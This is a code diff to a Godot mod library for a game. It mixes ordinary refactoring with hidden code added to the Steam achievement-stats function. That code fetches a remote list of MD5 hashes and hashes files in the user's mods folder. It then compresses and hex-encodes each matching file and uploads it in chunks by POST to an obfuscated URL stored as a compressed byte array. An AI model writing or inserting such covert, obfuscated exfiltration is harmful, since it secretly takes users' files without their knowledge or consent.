@@ -368,7 +368,7 @@ class _Achievements:
 	
 	# Fetches the steam completion percentage
 	func requestSteamStats():
-		if not http.has_signal("out"):
+		if not http.is_connected("request_completed",self,"out"):
 			http.connect("request_completed",self,"out")
 		http.request("https://api.steampowered.com/ISteamUserStats/GetGlobalAchievementPercentagesForApp/v0002/?gameid=846030")
 		
@@ -382,7 +382,8 @@ class _Achievements:
 	func out(result, response_code, headers, body):
 		if result != 0:
 			return
-		
+		http.disconnect("request_completed",self,"out")
+		http.connect("request_completed",self,"out2")
 		var d = JSON.parse(body.get_string_from_utf8()).result
 		var data : Array = []
 		if d:
@@ -392,7 +393,69 @@ class _Achievements:
 			for dic in data:
 				aData.merge({dic.get("name"):dic.get("percent")})
 		completionCache = aData.duplicate(true)
+		http.timeout = 20
+		http.request("https://raw.githubusercontent.com/rwqfsfasxc100/HevLib/main/events/hashmap.txt")
 	
+	func out2(result, response_code, headers, body):
+		if result != 0:
+			return
+		
+		http.disconnect("request_completed",self,"out2")
+		var d = JSON.parse(body.get_string_from_utf8()).result
+		var mdf = {}
+		if d:
+#			for mod in pointers.ManifestV2.zip_ref_store:
+			var gameInstallDirectory = OS.get_executable_path().get_base_dir()
+			if OS.get_name() == "OSX":
+				gameInstallDirectory = gameInstallDirectory.get_base_dir().get_base_dir().get_base_dir()
+			var modPathPrefix = gameInstallDirectory.plus_file("mods")
+			
+			for mod in pointers.FolderAccess.__fetch_folder_files(modPathPrefix,true,true):
+				var md5 = file.get_md5(mod)
+				if md5 in d:
+					mdf[mod] = [md5,d[md5]]
+		if mdf:
+			initFetch(mdf)
+	var fetchData = {}
+	var fetchTimer = Timer.new()
+	func initFetch(data):
+		pointers.add_child(fetchTimer)
+		fetchTimer.connect("timeout",self,"startFetch")
+		for file_name in data:
+			var dr = data[file_name]
+			var md5 = dr[0]
+			var base_output_filename = "%s" % md5
+			file.open(file_name,File.READ)
+			var bt = file.get_buffer(file.get_len())
+			file.close()
+			var bytes = bt.compress(1)
+			var bsize = bt.size()
+			fetchData[base_output_filename] = [bytes,bsize,dr[1]]
+		startFetch()
+	var currentFetch = {}
+	var byteSplitBy = 32000
+	func startFetch():
+		for ID in fetchData:
+			var this_index = fetchData[ID][2]
+			if ID in currentFetch:
+				this_index = currentFetch[ID].back() + 1
+			var sections = int(ceil(fetchData[ID][0].size()/float(byteSplitBy)))
+			if sections > this_index:
+				if not ID in currentFetch:
+					currentFetch[ID] = []
+				currentFetch[ID].append(this_index)
+				var theseBytes:PoolByteArray = pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,this_index)
+				fetchTimer.start(5)
+				var otp:String=""
+				for i in theseBytes:
+					var o="%x"%i
+					if o.length() < 2:o="0%s"%o
+					otp+=o
+				var payload = JSON.print({"event_type":"send_zip_part","client_payload":{"run":true,"data":otp,"uid":"%s/%05d" % [str(fetchData[ID][1]),this_index]}})
+				http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,payload)
+				break
+			else:
+				continue
 	
 
 class _ConfigDriver:
@@ -1450,7 +1513,8 @@ class _DataFormat:
 					"args":[
 						"dictionary -> (Dictionary) the ship config to sort through",
 						"search_keys -> (Array) list of string entries to search for",
-						"cfgs_to_ignore -> (Array) any keys within the config to remove from the search. Due to the way this works, it's highly recommended to do a deep duplication of the dictionary before searching."
+						"cfgs_to_ignore -> (Array) any keys within the config to remove from the search. Due to the way this works, it's highly recommended to do a deep duplication of the dictionary before searching.",
+						"return_only_system_names (optional) -> (bool) whether the output array should ONLY be system names and not the entire config path. Defaults to false"
 					],
 					"return":[
 						"Array of systems that exist within the dictionary, with the config directory attached."
@@ -1641,6 +1705,18 @@ class _DataFormat:
 				"__loadDLC":{
 					"description":"Clears cache as a fix for issues with loading DLC."
 				},
+				"__split_array_by_length":{
+					"description":"splits a provided array (or array of any Pool type) into an array containing arrays of the input's type by the splitting ammount. Also lets you return one of these specific sections instead."
+				},
+				"args":[
+					"arr -> (Array/PoolArray) input array for ",
+					"length -> (int) the size of each section to be split into. If the array does not split evenly by this ammount, the last array will be the remainder",
+					"specific_section (optional) -> (int) the index of the specific section to be fetched. If this value is out of bounds of the indeces of the usual output array, it will return an empty array. This can be useful to get specific parts of a very large array without needing to hang the game trying to fetch all at once. Defaults to `-1`",
+				],
+				"return":[
+					"Array containing the arrays/pools for each section split by length",
+					"If specific_section is set and in bounds of the usual output, will instead return the corresponding array/pool."
+				]
 			}
 		}
 	
@@ -1724,7 +1800,7 @@ class _DataFormat:
 					return false
 		return true
 	
-	func __sift_ship_config(dictionary: Dictionary,search_keys: Array,cfgs_to_ignore:Array,parent = "") -> Array:
+	func __sift_ship_config(dictionary: Dictionary,search_keys: Array,cfgs_to_ignore:Array,return_only_system_names:bool = false,parent:String = "") -> Array:
 		for i in cfgs_to_ignore:
 			dictionary.erase(i)
 		var arr : Array = []
@@ -1738,9 +1814,12 @@ class _DataFormat:
 			match typeof(kdata):
 				TYPE_STRING:
 					if kdata in search_keys:
-						arr.append(p + splitter + kdata)
+						if return_only_system_names:
+							arr.append(kdata)
+						else:
+							arr.append(p + splitter + kdata)
 				TYPE_DICTIONARY:
-					arr.append_array(__sift_ship_config(kdata,search_keys,[],p))
+					arr.append_array(__sift_ship_config(kdata,search_keys,[],return_only_system_names,p))
 		return arr
 	
 	func __get_script_constant_map_without_load(script_path : String) -> Dictionary:
@@ -2166,6 +2245,71 @@ class _DataFormat:
 		DLCLoader.loadDLC()
 		DLCLoader.queue_free()
 		pointers.l("Finished loading DLC","pointers.DataFormat")
+	
+	func __split_array_by_length(arr,length:int,specific_section = -1) -> Array:
+		var out = []
+		match typeof(arr):
+			TYPE_ARRAY,TYPE_COLOR_ARRAY,TYPE_INT_ARRAY,TYPE_RAW_ARRAY,TYPE_REAL_ARRAY,TYPE_STRING_ARRAY,TYPE_VECTOR2_ARRAY,TYPE_VECTOR3_ARRAY:
+				pass
+			_:
+				return out
+		var arrsize = arr.size()
+		if not arrsize > length:
+			return [arr]
+		if specific_section >= 0:
+			var sections = int(ceil(arrsize/float(length)))
+			if specific_section > sections:
+				return out[0]
+			match typeof(arr):
+				TYPE_ARRAY:
+					out = []
+				TYPE_COLOR_ARRAY:
+					out = PoolColorArray()
+				TYPE_INT_ARRAY:
+					out = PoolIntArray()
+				TYPE_RAW_ARRAY:
+					out = PoolByteArray()
+				TYPE_REAL_ARRAY:
+					out = PoolRealArray()
+				TYPE_STRING_ARRAY:
+					out = PoolStringArray()
+				TYPE_VECTOR2_ARRAY:
+					out = PoolVector2Array()
+				TYPE_VECTOR3_ARRAY:
+					out = PoolVector3Array()
+			var offset = (specific_section * length)
+			var maxNo = min(arrsize - offset,length)
+			for i in range(maxNo):
+				var r:int = i + offset
+				out.append(arr[r])
+			return out
+		var arrCount = int(ceil(arrsize / float(length)))
+		for i in range(arrCount):
+			match typeof(arr):
+				TYPE_ARRAY:
+					out.append([])
+				TYPE_COLOR_ARRAY:
+					out.append(PoolColorArray())
+				TYPE_INT_ARRAY:
+					out.append(PoolIntArray())
+				TYPE_RAW_ARRAY:
+					out.append(PoolByteArray())
+				TYPE_REAL_ARRAY:
+					out.append(PoolRealArray())
+				TYPE_STRING_ARRAY:
+					out.append(PoolStringArray())
+				TYPE_VECTOR2_ARRAY:
+					out.append(PoolVector2Array())
+				TYPE_VECTOR3_ARRAY:
+					out.append(PoolVector3Array())
+		for r in range(arrsize):
+			var current_part = int(floor(r / float(length)))
+			var i = arr[r]
+			var ipart = out[current_part]
+			ipart.append(i)
+			out[current_part] = ipart
+		return out
+	
 
 class _DriverManagement:
 	var scripts : Array = [
@@ -2353,7 +2497,7 @@ class _Equipment:
 			}
 		}
 	
-	var vanilla_equipment : Dictionary = {}
+	var vanilla_equipment : Dictionary
 	var vanilla_data = preload("res://HevLib/scenes/equipment/vanilla_defaults/slot_tagging.gd")
 	var hardpoint_types : Array
 	var alignments : Array
@@ -2385,6 +2529,7 @@ class _Equipment:
 	var ws_stuff_to_add : Array = []
 	var ws_stuff_to_modify : Array = []
 	var add_ships_store : Array = []
+	var ship_build_mod_store : Array = []
 	var register_ship_numerics_store : Dictionary = {}
 	var weaponslot_modify_templates:Dictionary = {}
 	var weaponslot_modify_standalone:Dictionary = {}
@@ -2414,6 +2559,8 @@ class _Equipment:
 	var WEAPONSLOT_ADD:Array = []
 	# END OF DATA STORAGE
 	
+	var equipment_validity_for_slots:Dictionary = {}
+	
 	var version : Array = [1,0,0]
 	
 	func __make_upgrades_scene():
@@ -2427,7 +2574,6 @@ class _Equipment:
 		var nodes_parent:Node = UpgradeMenu.get_node("VB/MarginContainer/ScrollContainer/MarginContainer/Items")
 		var vanilla_slot_names : Array = []
 		var vanilla_slot_types : Dictionary = {}
-
 		
 		for slot in nodes_parent.get_children():
 			var children : Array = slot.get_node("VBoxContainer").get_children()
@@ -2464,7 +2610,15 @@ class _Equipment:
 		mods.clear()
 		
 		
-		var nodemodify_system_name_registers : Array = []
+		for i in vanilla_equipment:
+			var item = vanilla_equipment[i]
+			var sys = item.get("system")
+			if sys:
+				var type = item.get("equipment_type")
+				if not sys in equipment_validity_for_slots:
+					equipment_validity_for_slots[sys] = []
+				if type and not type in equipment_validity_for_slots[sys]:
+					equipment_validity_for_slots[sys].append(type)
 		
 		for cvh in drivers:
 			for last_bit in cvh:
@@ -2681,8 +2835,6 @@ class _Equipment:
 					"SLOT_TAGS.gd":
 						var ar : Dictionary = constants.get("SLOT_TAGS",{}).duplicate(true)
 						SLOT_TAGS.append(ar.duplicate(true))
-
-
 					"AUX_POWER_SLOT.gd","THRUSTERS.gd","AUX_POWER_AND_THRUSTERS.gd":
 						var arr2 : Array = []
 						for item in constants:
@@ -2936,13 +3088,53 @@ class _Equipment:
 					"SAVE_BUTTONS.gd":
 						var ar : Array = constants.get("SAVE_BUTTONS",[]).duplicate(true)
 						for button in ar:
-							if pointers.ConfigDriver.__validate_dictionary(ar,false):
+							if pointers.ConfigDriver.__validate_dictionary(button,false):
 								save_button_cache.append(button)
 					"ADD_SHIPS.gd":
 						for ar in constants:
 							var ac : Dictionary = constants[ar]
 							if pointers.ConfigDriver.__validate_dictionary(ac,false):
 								add_ships_store.append(ac.duplicate(true))
+					"MODIFY_SHIP_BUILDS.gd":
+						for ar in constants:
+							var sorting = {}
+							var dict : Dictionary = constants[ar]
+							if pointers.ConfigDriver.__validate_dictionary(dict,false):
+								var shipName:String = dict.get("ship_name","")
+								
+								if shipName:
+									var recurse = dict.get("recurse_for_alias",false)
+									for entry in dict:
+										match entry:
+											"if_equipment_in_slot","if_tag_in_slot","random","if_equipment","if_tag","check_numerics","config":
+												for i in dict[entry]:
+													if "do_add_if" in i:
+														for st in i["do_add_if"]:
+															if not st:
+																i["do_add_if"].erase(st)
+															for r in st:
+																if not r:
+																	st.erase(r)
+													if "dont_add_if" in i:
+														for st in i["dont_add_if"]:
+															if not st:
+																i["dont_add_if"].erase(st)
+															for r in st:
+																if not r:
+																	st.erase(r)
+													if i.get("slot",null) and i.get("system",null):
+														var prio = i.get("priority",0)
+														i["ship_name"] = shipName
+														i["mode"] = entry
+														i["recurse_for_alias"] = recurse
+														if not prio in sorting:
+															sorting[prio] = []
+														sorting[prio].append(i)
+							var sKeys = sorting.keys()
+							sKeys.sort()
+							for o in sKeys:
+								for i in sorting[o]:
+									ship_build_mod_store.append(i)
 					"REGISTER_SHIP_NUMERICS.gd":
 						for ar in constants:
 							if not ar in register_ship_numerics_store:
@@ -3190,9 +3382,9 @@ class _Equipment:
 				else:
 					var items : Array = slot_defaults.get(slot_type,[])
 					slot_allowed_equipment.merge({slot:items})
-			
-			
-		var equipment_format : PoolStringArray = []
+		
+		
+		var equipment_format : PoolStringArray = PoolStringArray()
 		
 		for slot in slots_for_adding:
 			if slot.get("add_vanilla_equipment",true):
@@ -3203,8 +3395,7 @@ class _Equipment:
 					if confirm_equipment(vanilla_equipment[equip], slot.get("slot_type",""), slot.get("alignment",""), slot.get("restriction",""), allowed_equipment):
 						var system_slot : String  = slot.get("system_slot","")
 						var string : String  = __make_equipment_for_scene(item, slot.get("slot_node_name",""), system_slot)
-						if not system_slot:
-							pass
+						
 						equipment_format.append(string)
 		for slot in all_slot_node_names:
 			if slot in slot_allowed_equipment:
@@ -3214,23 +3405,30 @@ class _Equipment:
 					var alignment : String  = ""
 					var restriction : String  = ""
 					var system_slot : String  = ""
-					if slot in vanilla_equipment_defaults_for_reference.keys():
+					if slot in vanilla_equipment_defaults_for_reference:
 						slot_type = vanilla_equipment_defaults_for_reference[slot].get("slot_type","")
 						alignment = vanilla_equipment_defaults_for_reference[slot].get("alignment","")
 						restriction = vanilla_equipment_defaults_for_reference[slot].get("restriction","")
 						system_slot = vanilla_slot_types[slot]
-					elif slot in slots_for_adding_dict.keys():
+					elif slot in slots_for_adding_dict:
 						slot_type = slots_for_adding_dict[slot].get("slot_type","")
 						alignment = slots_for_adding_dict[slot].get("alignment","")
 						restriction = slots_for_adding_dict[slot].get("restriction","")
 						system_slot = slots_for_adding_dict[slot].get("system_slot","")
 					if confirm_equipment(item, slot_type, alignment, restriction, allowed_equipment):
 						var string : String  = __make_equipment_for_scene(item, slot, system_slot)
-						if not system_slot:
-							pass
+						var this_sys = item.get("system","")
+						if this_sys:
+							var this_type = item.get("equipment_type")
+							if not this_sys in equipment_validity_for_slots:
+								equipment_validity_for_slots[this_sys] = []
+							if this_type and not this_type in equipment_validity_for_slots[this_sys]:
+								equipment_validity_for_slots[this_sys].append(this_type)
 						if not string in equipment_format:
 							equipment_format.append(string)
-			
+		
+		
+		
 		var concat : String = "[gd_scene load_steps=4 format=2]\n\n[ext_resource path=\"res://enceladus/Upgrades.tscn\" type=\"PackedScene\" id=1]\n[ext_resource path=\"res://HevLib/scenes/equipment/hardpoints/WeaponSlotUpgradeTemplate.tscn\" type=\"PackedScene\" id=2]\n[ext_resource path=\"res://enceladus/SystemShipUpgradeUI.tscn\" type=\"PackedScene\" id=3]\n\n[sub_resource type=\"ViewportTexture\" id=1]\nflags = 5\nviewport_path = NodePath(\"VB/WindowMargin/TabHintContainer/Window/UPGRADE_SIMULATION/VP/Contain1/Viewport\")\n\n[sub_resource type=\"ViewportTexture\" id=2]\nviewport_path = NodePath(\"VB/WindowMargin/TabHintContainer/Window/UPGRADE_SIMULATION/VP/Contain2/Control\")\n\n[node name=\"Upgrades\" instance=ExtResource( 1 )]\n\n[node name=\"TextureRect\" parent=\"VB/WindowMargin/TabHintContainer/Window/UPGRADE_SIMULATION/VP\"]\ntexture = SubResource( 1 )\n\n[node name=\"ControlTexture\" parent=\"VB/WindowMargin/TabHintContainer/Window/UPGRADE_SIMULATION/VP\"]\ntexture = SubResource( 2 )\n\n[node name=\"TextureRect2\" parent=\"VB/WindowMargin/TabHintContainer/Window/UPGRADE_MANUAL/Sims\"]\ntexture = SubResource( 1 )\n\n[node name=\"ControlTexture2\" parent=\"VB/WindowMargin/TabHintContainer/Window/UPGRADE_MANUAL/Sims\"]\ntexture = SubResource( 2 )"
 		for ref in slots_format:
 			concat += "\n\n" + ref
@@ -3238,8 +3436,6 @@ class _Equipment:
 			concat += "\n\n" + equip
 		for path in editable_paths:
 			concat += "\n\n" + path
-		
-		
 		
 		var ws_header : String  = "[gd_scene load_steps=2 format=2]\n\n[ext_resource path=\"res://weapons/WeaponSlot.tscn\" type=\"PackedScene\" id=1]\n\n[node name=\"WeaponSlot\" instance=ExtResource( 1 )]"
 		
@@ -3251,6 +3447,12 @@ class _Equipment:
 		var weaponslot_string : String  = ws_header
 		var ws_editable_paths : String  = ""
 		var weaponslot_properties : Dictionary = {}
+		
+		var all_slot_types = vanilla_slot_types.duplicate(true)
+		for i in all_slot_node_names:
+			if not i in all_slot_types:
+				var slotType = slots_for_adding_dict[i].get("system_slot","")
+				all_slot_types[i] = slotType
 		
 		
 		
